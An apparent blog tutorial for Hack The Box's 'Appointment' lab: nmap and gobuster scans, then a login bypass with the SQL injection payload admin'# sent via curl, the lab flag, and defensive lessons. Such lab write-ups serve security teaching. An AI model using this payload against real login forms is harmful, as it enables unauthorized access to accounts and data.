---
title: "Exploiting HTB’s ‘Appointment’ Box with SQL Injection"
published: false
tags: [hackthebox, sqlinjection, pentesting, tutorial]
---

## Introduction

In this tutorial, we’ll exploit an SQL Injection vulnerability in Hack The Box’s **Appointment** web app to bypass authentication and retrieve the flag.

You’ll learn to:
- Discover targets with `nmap`  
- (Optionally) brute-force directories with `gobuster`  
- Craft an SQLi payload to bypass a login form  
- Automate the entire exploit with a Bash script  

## Prerequisites

- Kali Linux (or any distro with `nmap`, `gobuster`, `curl`)  
- Active HTB VPN connection  

---

## 1. Scan for Open Services

Identify the web server and version:

```bash
nmap -sC -sV 10.129.99.212 -oN screenshots/nmap.png
```

<details>
<summary>Output snippet</summary>

```text
80/tcp open  http    Apache httpd 2.4.38 (Debian)
```
</details>

---

## 2. (Optional) Directory Brute-Force

Use Gobuster to check for hidden paths:

```bash
gobuster dir -u http://10.129.99.212 -w /usr/share/wordlists/dirb/common.txt -o screenshots/gobuster.png
```

No sensitive directories were found.

---

## 3. SQL Injection Exploitation

Target the login form with this payload:

- **Username:** `admin'#`  
- **Password:** anything  

This payload closes the username clause and comments out the rest of the SQL query, bypassing the password check.

```bash
curl -s -X POST http://10.129.99.212/login      -d "username=admin'#&password=dummy" -L
```

You should see a page indicating you are logged in as **admin**, revealing the flag.

```
Flag: e3d0796d002a446c0e622226f42e9672
```

---

## 4. Automation Script

Reproduce the exploit with `scripts/login-sqli.sh`:

```bash
bash scripts/login-sqli.sh 10.129.99.212
```

---

## 5. Lessons Learned

- Unsanitized inputs on login forms lead to trivial SQLi bypass.  
- Always use parameterized queries or stored procedures.  
- Implement input validation and Web Application Firewalls.

---

🔗 **Full write-up & code:** https://github.com/keyfive5/obsidiansignal-htb-appointment  
